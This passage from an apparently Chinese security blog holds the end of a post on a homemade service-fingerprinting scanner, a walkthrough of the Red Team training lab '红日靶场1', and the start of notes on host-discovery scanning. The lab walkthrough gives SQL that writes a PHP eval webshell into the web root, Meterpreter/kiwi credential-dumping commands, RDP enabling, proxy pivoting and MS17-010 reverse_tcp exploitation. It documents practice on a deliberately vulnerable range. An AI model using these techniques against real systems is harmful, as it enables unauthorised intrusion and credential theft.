class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    # 创建UDP socket</span><br><span class="line">    s = socket.socket(socket.AF_INET<span class="punctuation">,</span> socket.SOCK_DGRAM<span class="punctuation">,</span> socket.IPPROTO_UDP)</span><br><span class="line">    # 允许端口复用</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET<span class="punctuation">,</span> socket.SO_REUSEADDR<span class="punctuation">,</span> <span class="number">1</span>)</span><br><span class="line">    # 绑定监听多播数据包的端口</span><br><span class="line">    s.bind((ANY<span class="punctuation">,</span> port))</span><br><span class="line">    s.sendto(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)<span class="punctuation">,</span> (ip<span class="punctuation">,</span> port))</span><br><span class="line">    s.settimeout(<span class="number">1</span>)</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        data<span class="punctuation">,</span> address = s.recvfrom(<span class="number">2048</span><span class="punctuation">,</span> )</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        pass</span><br><span class="line">    else<span class="punctuation">:</span></span><br><span class="line">        for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">            if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=data)<span class="punctuation">:</span></span><br><span class="line">                info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                print(info)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure><h2 id="测试过程"><a class="markdownIt-Anchor" href="#测试过程"></a> 测试过程</h2><h3 id="搭建测试环境-fapro"><a class="markdownIt-Anchor" href="#搭建测试环境-fapro"></a> 搭建测试环境 fapro</h3><p>FaPro 是一个服务端协议模拟工具,可以轻松启停多个网络服务。用来测试服务扫描工具，显然比自己一个一个安装方便很多。下载地址：<a href="https://github.com/fofapro/fapro">https://github.com/fofapro/fapro</a>环境建议：用 Win8 或 win10，试了 win7 提示 Windows 版本太低，win11 莫名报错；Linux 下开 fapro 上的服务显示端口占用，没找到解决方法，一不开心就给你 error 退出。以下测试在 win10 虚拟机里跑 fapro，win11 物理机上跑 nmap 和自制扫描器。在 releases 中下载可执行文件：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkFftulHhJXTHxLHmtyWDFx0EKVP.png" alt="" />拖到虚拟机里，在 fapro 的目录下打开终端，输入命令：<code>fapro genConfig &gt; fapro.json</code>得到配置 json 文件，这一步我 win11 和 win10 都试过，发现该文件是 utf-16 的编码，fapro 识别不了会报错（也很离谱），可以用 notepad++转成 utf-8 编码。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FneZutK7thpTkXEk07IatulsGlWV.png" alt="" />输入运行命令：<code>fapro run -v -l :8080</code>浏览器中打开本机 ip:8080 即可看到配置界面：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtMFi_hK02smLq0IFBoIax3susEp.png" alt="" />选择相应的服务，点击“+New”开启，可以在跑 fapro 的终端里看到日志信息：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FoeFVsRmbLF7bEdP8UyR6Aa9GTWB.png" alt="" />如果这一步显示报错某个端口已经占用了，可以修改 fapro.json 文件中对应的端口。简单试一下 ssh 服务（默认账号 root/123456）：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlnADP3RTC7TlUuwZB_gVmhUDpT8.png" alt="" />fapro 对应输出：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FjrDoeOzF9v_4EGg9tnIYRojv6Ll.png" alt="" />这样环境就搭好了。</p><h3 id="测试结果"><a class="markdownIt-Anchor" href="#测试结果"></a> 测试结果</h3><p>把 fapro 能开的服务全部打开，使用自制扫描器进行服务扫描的结果：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmS49Qk0YNvgvb_uSXRUclA7ilFH.png" alt="" />使用 nmap 扫描的结果：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhbEX-Q9HExk0MJ3OiYESfX-pHsy.png" alt="" />[111,554,1234,1433,1521,3389,5432,7001,8080,8888,9200,20000,49152]这些端口自制扫描器扫不到，以下是原因研究：首先分析流量，下图是 nmap 扫 554（rtsp）端口的流量（命令：<code>nmap IP -p 554 -sV</code>）：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiqlKJCSNaXru5nAuPJ0b2E1F5Jv.png" alt="" />发现握手之后，跑 fapro 的 host 会一直发[FIN,ACK]包，想结束这此通信，而跑 nmap 的 host 不甘心，一直发探针，但一直收不到回应，这就是自制扫描器扫不出来的原因，自制扫描器需要根据响应内容进行正则匹配来判断。nmap 结果：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FscI3BnXh1yQNEErR3AJV4TAGjaf.png" alt="" />rtsp 后面的“？” 很可疑！换一个端口跑 rtsp 服务：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq27ZY4J5hWbKQ0WppyRfzeR7U1Q.png" alt="" />扫 555 端口 rtsp 服务的 nmap 结果：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FormpTs5yQAvmWq18KZ4bjf4WvLq.png" alt="" />果然！因为没有响应包，nmap 也不能确认 555 端口跑的具体什么服务，直接根据端口判断成另外一个服务了。新机子瓦伊多姿，如果响应包内容不在 nmap 的指纹库内，nmap 并不能判断该端口上跑的服务，只是根据端口判断。到这里，基本可以实现了与 nmap 同等能力的服务识别功能。</p><h1 id="改进"><a class="markdownIt-Anchor" href="#改进"></a> 改进</h1><ul><li>ssl 还没有测试</li><li>结果输出未做去重和排序，单纯开线程跑，各种包的响应速度不一样导致结果输出不可控</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场1 kali2022.2</title>
      <link href="/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/"/>
      <url>/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/</url>
      
        <content type="html"><![CDATA[<p>详细教程<a href="https://blog.csdn.net/YouthBelief/article/details/120974079">这个博客</a>里已经写的很清楚了，下面只记录一些我的收获和过程踩了不少坑，仍有未解决的东西，记录我的过程应该也有点参考价值吧</p><h1 id="一-环境搭建"><a class="markdownIt-Anchor" href="#一-环境搭建"></a> 一、环境搭建</h1><h2 id="1环境搭建测试"><a class="markdownIt-Anchor" href="#1环境搭建测试"></a> 1.环境搭建测试</h2><p><a href="https://blog.51cto.com/u_15302226/5189485">[WEB 安全]红日靶场（一）环境搭建</a>有一点小误区，物理机访问 web 时，应用 NAT 的地址搭建完成后记得测试内网三台机子之间的连通性（之前正常，后来 ping 不通，可以尝试重启）</p><h2 id="2信息收集"><a class="markdownIt-Anchor" href="#2信息收集"></a> 2.信息收集</h2><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnDi9PS3wjj_6kR0NE2gm1Vx61T-.png" alt="" /></p><ul><li>活动主机</li></ul><p>Netdiscover 是一种网络扫描工具，通过 ARP 扫描发现活动主机，可以通过主动和被动两种模式进行 ARP 扫描。通过主动发送 ARP 请求检查网络 ARP 流量，通过自动扫描模式扫描网络地址。<a href="https://www.cnblogs.com/hiyong/p/14590209.html">Netdiscover 使用</a></p><ul><li>端口扫描<ul><li>Masscan</li></ul></li></ul><p>masscan 的扫描结果类似于 nmap(一个很著名的端口扫描器)，在内部，它更像 scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan 更加灵活，它允许自定义任意的地址范和端口范围。<a href="https://blog.csdn.net/nex1less/article/details/108195321">Masscan 使用</a></p><ul><li>nmap</li></ul><p>（nmap 能扫出来的东西好多<a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap 详细用法</a></p><h1 id="二-漏洞利用"><a class="markdownIt-Anchor" href="#二-漏洞利用"></a> 二、漏洞利用</h1><h2 id="3漏洞搜索与利用"><a class="markdownIt-Anchor" href="#3漏洞搜索与利用"></a> 3.漏洞搜索与利用</h2><p>nmap 确定服务<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5gThsZ6nRpYRW1UolP3AUEWsWB.png" alt="" />御剑目录扫描，主要依赖字典强度，御剑内置了几个字典可以拿来直接用<a href="https://github.com/rootphantomer/Blasting_dictionary">目录爆破字典-github</a><a href="https://github.com/foryujian/yjdirscan">github 御剑</a><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkHI7p8vaVPcYWA9YnwH2nkXyp4v.png" alt="" />然后看到 phpmyadmin，爆破用户名密码，登上去</p><h2 id="4后台-getshell-上传技巧"><a class="markdownIt-Anchor" href="#4后台-getshell-上传技巧"></a> 4.后台 Getshell 上传技巧</h2><p>上传 webshell 有两个难点</p><ol><li>上传 shell</li><li>知道 shell 上传的路径</li></ol><p>通过 sql，博客提到了两种方法：</p><ul><li>通过写入文件</li></ul><p><a href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fshow.html&amp;token=ec216890e220ba8ba9bda74b2167b9c7">SHOW</a> <strong>GLOBAL</strong> <strong>VARIABLES</strong> <a href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fstring-comparison-functions.html%23operator_like&amp;token=ec216890e220ba8ba9bda74b2167b9c7">LIKE</a> '%secure%'博客里说“为 NULL 不可写入文件，要想修改 Value 值 只能通过配置文件 mysql.ini 修改”，然后我尝试修改 secure_auth，成功<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhoqzldCNUX5xa0S4Zjj9MiLBTLr.png" alt="" />但是修改 secure_file_priv 失败，此路确实不通<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmxO3jAYxTWltVCizaNpwMzXJzmt.png" alt="" />记录一下通过文件方式上传 shell 的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"></span><br><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO dumpfile &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">区别在于使用outfile时,文件中一行的末尾会自动换行</span></span><br></pre></td></tr></table></figure><ol start="2"><li>通过全局日志文件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FrU_T_WPFwqJAoy_sRZziQAtvlaH.png" alt="" />需要先开启日志功能，根据查询结果可以看到日志路径，但不是可以通过网址访问的路径，于是需要改日志文件的位置，通过 sql 结果可以看到 phpstudy 的路径，直接可以锁定：'C:/phpStudy1/WWW/3.php'，通过 sql 语句<code>SELECT '&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;'</code>上传成功，蚁剑连接</p><ol start="3"><li>使用慢查询日志 getsehll</li></ol><p>这个<a href="https://blog.csdn.net/qq_41821603/article/details/109948920">博客</a>使用了慢日志 getshell步骤：</p><ul><li>开启慢日志</li><li>指定慢日志存放位置</li><li></li></ul><ol start="4"><li><p>使用错误日志 getshell</p></li><li><p>利用 phpmyadmin4.8.x 本地文件包含漏洞 getshell</p></li></ol><h2 id="5系统信息收集"><a class="markdownIt-Anchor" href="#5系统信息收集"></a> 5.系统信息收集</h2><ol><li>是否存在域</li></ol><p>判断方法</p><ul><li>whoami hostname 对比</li><li>ipconfig /all 看 DNS</li><li>systeminfo 看是否有域一栏</li></ul><p><a href="https://blog.csdn.net/qq_45290991/article/details/118539048">这个博客</a>写收集信息更清晰一些，后面的密码收集也写的不错</p><ol start="2"><li>网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ipconfig 看所处网段是否有多个</span><br><span class="line">netstat -ano 查看网络连接和开放端口</span><br><span class="line">net start  查看启动的服务  用于提权</span><br><span class="line">tasklist   查看开启的进程</span><br><span class="line">tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan</span><br><span class="line">ping baidu  看是否可以出网等</span><br><span class="line">net user   存在用户</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>翻看 txt 文件</li></ol><p>有些博客中还提到 CS，CS 是 Cobalt Strike 的简称，是一款渗透测试神器，常被业界人称为 CS 神器。Cobalt Strike 已经不再使用 MSF 而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。<a href="https://blog.csdn.net/zzwwhhpp/article/details/111773395">CS 安装与用法</a>，到官网看了一下，发现需要花钱，然后搜着搜着看到 cs 的免费版本 Armitage，应该是 kali 有自带的，然后发现我的 kali 没有</p><p><a href="https://blog.csdn.net/BuNahua/article/details/120037331">在红日靶场 1 中的实例</a></p><h2 id="6主机密码收集"><a class="markdownIt-Anchor" href="#6主机密码收集"></a> 6.主机密码收集</h2><p>先提权，然后 load kiwi 获得主机密码</p><p>遇到问题：这里运行<code>run hashdump</code>时出现错误：Error: ArgumentError wrong number of arguments (given 4, expected 5) ，暂未找到解决方法。看<a href="https://blog.hz2016.com/2022/05/%e3%80%90cfs%e3%80%91%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba%e4%b8%80/">这里</a>说报错是由于 kali 的内核版本问题，我用的是当前（2022.5）kali 的最新版本，前面贴出的博客也提到换了旧版就可以执行，这里就不试了。使用 kiwi 模块时，运行<code>creds_all</code>出错：ActiveRecord（翻译：错误运行命令 creds_all: ActiveRecord::RecordInvalid 验证失败:数据不是&lt;lan manager 十六进制 hash=&quot;&quot;&gt;:&lt;nt lan=&quot;&quot; manager 十六进制摘要=&quot;&quot;&gt;的 NTLMHash 数据格式，其中每个十六进制摘要是 32 个小写的十六进制字符。</nt></lan>）</p><p>kiwi<a href="https://blog.csdn.net/qq_46258964/article/details/125210258">内网渗透 Windows 密码凭证获取</a> 只需要看 msf 部分，写的挺清楚的migrate x64 的进程号后，加载 mimikatz 模块有警告:&quot;The &quot;mimikatz&quot; extension has been replaced by &quot;kiwi&quot;.&quot;，对应<code>mimikatz_command -f sekurlsa::searchPasswords</code>现在需要写成<code>kiwi_cmd sekurlsa::logonpasswords</code>（命令错了会提示合法参数，可以说很贴心了）<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlrEdshhOTUXenDEO5UQckIsNY3z.png" alt="" /></p><p>为什么要用 nmap 扫 3389 端口？3389 是远程桌面服务端口，<code>run post/windows/manage/enable_rdp</code>开启这个端口<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FujZjE9ZS4iPbx_tLvbEQDNvgmnM.png" alt="" />果然登进来了（先做了下一步内网穿透，不知道有没有关系）</p><h1 id="三-内网搜集"><a class="markdownIt-Anchor" href="#三-内网搜集"></a> 三、内网搜集</h1><h2 id="7内网继续信息收集"><a class="markdownIt-Anchor" href="#7内网继续信息收集"></a> 7.内网–继续信息收集</h2><h3 id="msf-socks4a-proxychains-穿透内网"><a class="markdownIt-Anchor" href="#msf-socks4a-proxychains-穿透内网"></a> msf socks4a proxychains 穿透内网</h3><p>这里的思路是先建立攻击机到内网的路由，然后再加一个 sock 代理，使得其他应用也可以访问内网，就可以进一步收集内网信息。内网信息收集可以参考这个，<a href="https://blog.csdn.net/YouthBelief/article/details/120974079">红日靶场 1 实战经验</a></p><p>问题：原博客中<code>use auxiliary/server/socks4a </code>找不到了，用了<code>auxiliary/server/socks_proxy</code>代替，可以参考<a href="https://blog.csdn.net/u014029795/article/details/117375754">msf 及 socks 代理转发</a><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl5RLbVz3odaF-8AHwxEtbHb0O5O.png" alt="" />（可爱）kali 最新版好像没有 proxychains ，使用 apt-get 安装然后我发现，<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FldZgayT5Huf-5cUylpBVnNrqToI.png" alt="" />另开一个窗口，访问内网主机不加 proxychain 反而有用？？<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FgXc88I_WmDzvYkuDxFRx3KzOi3w.png" alt="" />可能这个 auxiliary/server/socks_proxy 变成全局代理了</p><h2 id="8内网攻击姿势信息泄露"><a class="markdownIt-Anchor" href="#8内网攻击姿势信息泄露"></a> 8.内网攻击姿势–信息泄露</h2><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq7PG-EIinD4dPXtnKcETxuviYel.png" alt="" />跟着博客扫了永恒之蓝，发现存活的主机 win2003（141），xin2008（138）使用 发现 Exploit completed, but no session was created多次重复，发现了更多报错，看网上说是重启靶机，使用 vmware 发现依旧不能成功</p><p><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue 永恒之蓝）</a><a href="https://blog.csdn.net/qq_29277155/article/details/96865836">计算机病毒命名规则</a> <a href="https://blog.csdn.net/gwruiki/article/details/123807368">漏洞命名规则</a> ms 是微软漏洞库编号，格式：MS 年-编号尝试利用 ms17-010 反弹 shell</p><p>这里渗透失败了，是因为目标机是 32 位系统，而 MSF 内置的漏洞是 64 位的，需要安装 32 位的漏洞，可以参考<a href="https://blog.csdn.net/qq_41617034/article/details/91051614">利用 MS17-010 渗透 win7（32 位）</a>（防火墙拦着我不让我从浏览器下，找了个梯子，挂全局代理，git clone 才下下来）遇到了一个博主没遇到的问题：</p><blockquote><p><code>Error sending wrong architecture DLL to target</code></p></blockquote><p>是 payload 设错了，参考<a href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17</a>，<code>set payload windows/meterpreter/reverse_tcp</code><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FktBHjOewG9RHv0TMlSREeq0VRDU.png" alt="" />然后做到这一步，试了好多次都没成功（第二天重新搭环境来了一次，也没出来）看了原博客中使用的模块介绍，141 是 window2003，不在 target 之内，人傻了换 payload 试了 138，报“00a0:err:rpc:I_RpcReceive we got fault packet with status 0x1c010003”，查了半天也没看出来怎么解决。。所有 ms17-010 都试了一遍，能扫出来，就是 shell 出不来，先放弃了,原因在这个<a href="https://www.cnblogs.com/yokan/p/14021537.html">博客</a><a href="https://www.cnblogs.com/yokan/p/14021537.html">https://www.cnblogs.com/yokan/p/14021537.html</a></p><p>根据，拿下 141<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiHTuruX5AakcAwGozymd4OvqoTz.png" alt="" />然后发现卡了很久，，利用永恒之蓝系统容易崩，就当可以了吧</p><hr /><p>目前的进度是拿下 141，没有拿下 138，版本原因各种方法都试了一直有问题，有空再试试吧，有点耽误时间了</p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p>官网路线： 10.内网攻击姿势-SMB 远程桌面口令猜测</p><p>11.内网攻击姿势-Oracle 数据库 TNS 服务漏洞 12.内网攻击姿势-RPC DCOM 服务漏洞</p><p>四、横向移动 13.内网其它主机端口-文件读取 14.内网其它主机端口-redis 15.内网其它主机端口-redis Getshell 16.内网其它主机端口-MySQL 数据库 17.内网其它主机端口-MySQL 提权</p><p>五、构建通道 18.内网其它主机端口-代理转发</p><p>六、持久控制 19.域渗透-域成员信息收集 20.域渗透-基础服务弱口令探测及深度利用之 powershell 21.域渗透-横向移动[wmi 利用] 22.域渗透-C2 命令执行 23.域渗透-利用 DomainFronting 实现对 beacon 的深度隐藏 24.域渗透-域控实现与利用</p><p>七、痕迹清理25、日志清理</p><p>可以看到想进目标内网，需要先再外网打点，找到目标单位的外网服务站点、主机漏洞，并获得 Shell，再借助外网服务器当跳板机访问目标内网。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>扫描技术小记</title>
      <link href="/2022/07/14/%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/"/>
      <url>/2022/07/14/%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>文章大量内容参考了这本书：</p><p>内容不是很深，语言清晰易懂，看起来不太费劲，但颇有收获还有 NMAP 参考指南：</p><p>对于 NMAP 的使用方法介绍了很多，但原理不是很清晰</p><hr /> <span id="more"></span><h1 id="c-段扫描"><a class="markdownIt-Anchor" href="#c-段扫描"></a> C 段扫描</h1><p>C 段指的是同一内网段内的其他服务器，每个 IP 有 ABCD 四个段，举个例子，192.168.0.1，A 段就是 192，B 段是 168，C 段是 0，D 段是 1，而 C 段嗅探的意思就是拿下它同一 C 段中的其中一台服务器，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务器。</p><h2 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> ping</h2><p>1、主机可达发送一个 type = 8,code = 0 的 ICMP Request 包，表示这是一个请求包，如果顺利的到达对应的主机，主机会发送一个 type = 0，code = 0 的 ICMP Reply 包。如果发送方收到 Reply 包，就说明主机可达。</p><p>2、主机不可达发送一个 type = 8,code = 0 的 ICMP Request 包，如果路由器中不存在到达目的 IP 的路由的时候，会返回一个 type = 3，code = 1 的 ICMP 包，表示主机不可达。当发送方收到包后，发现 type = 3， code = 1，说明主机不可达</p><p>下面的是基于 bash 脚本，根据 ping 命令的输出来判断主机可不可达：<a href="https://blog.csdn.net/weixin_43623271/article/details/122113368">参考博客：ping 命令脚本</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> == <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;need an ip address&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> `<span class="built_in">seq</span> 1 254`; <span class="keyword">do</span></span><br><span class="line">ping -c 1 <span class="variable">$1</span>.<span class="variable">$ip</span> | grep <span class="string">&quot;64 bytes&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 4 | <span class="built_in">tr</span> -d <span class="string">&quot;:&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>该脚本支持并行，速度很快<strong>缺陷</strong>如果目标主机禁用 icmp 回显请求，就该方法失效。可以使用其他方法探测，接下来介绍基于 tcp 的探测方法。</p><h2 id="tcp-ack"><a class="markdownIt-Anchor" href="#tcp-ack"></a> tcp ack</h2><p><a href="https://blog.csdn.net/gongheng1125/article/details/51219404">主机存活探测方式</a>上面的博客介绍了很多探测方式，这里使用 ack 包进行测试</p><ul><li>若主机可达，则收到 RST 响应包。向目标主机发送 ACK 包，但目标主机并没有给本机发送 SYN 包表示要建立连接，而本机直接构造发送了 ACK 包表示同意连接，目标主机就会向我们回复 RST 数据包，表示不在线拒绝连接</li><li>若主机不可达，则不会收到响应包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dport = random.randint(<span class="number">1</span>, <span class="number">65535</span>)<span class="comment">#随机目的端口</span></span><br><span class="line">        packet = IP(dst=ip)/TCP(flags=<span class="string">&quot;A&quot;</span>,dport=dport)<span class="comment">#构造标志位为ACK的数据包</span></span><br><span class="line">        response = sr1(packet,timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(response[TCP].flags) == <span class="number">4</span>:<span class="comment">#判断响应包中是否存在RST标志位</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Host: %s on line&quot;</span> % ip)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    usage = <span class="string">&quot;Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;&quot;</span><span class="comment"># 输出帮助信息</span></span><br><span class="line">    parse = OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;filename&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address file&quot;</span>)<span class="comment"># 获取ip地址问及</span></span><br><span class="line">    parse.add_option(<span class="string">&quot;-i&quot;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;address&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address&quot;</span>)<span class="comment"># 获取网段地址</span></span><br><span class="line">    option, args = parse.parse_args()<span class="comment">#实例化用户输入的参数</span></span><br><span class="line">    filename = option.filename</span><br><span class="line">    address = option.address</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP ACK SCAN start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:<span class="comment"># 判断用户输出的参数是否为读取ip地址文件，并判断文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The file does not exist. Please enter it again&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:<span class="comment"># 读取文件</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">                ip = i.strip()<span class="comment"># 调用多线程去发送数据包</span></span><br><span class="line">                t = Thread(target=scan, args=(ip,))</span><br><span class="line">                t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address:<span class="comment">#判断用户输入的是为扫描网段</span></span><br><span class="line">        prefix = address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.&#x27;</span> + address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] + <span class="string">&#x27;.&#x27;</span> + address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">2</span>] + <span class="string">&quot;.&quot;</span><span class="comment"># 将用户输入的网段地址前三位以.作为分割提取出IP地址前缀</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">            ip = prefix + <span class="built_in">str</span>(i)<span class="comment"># 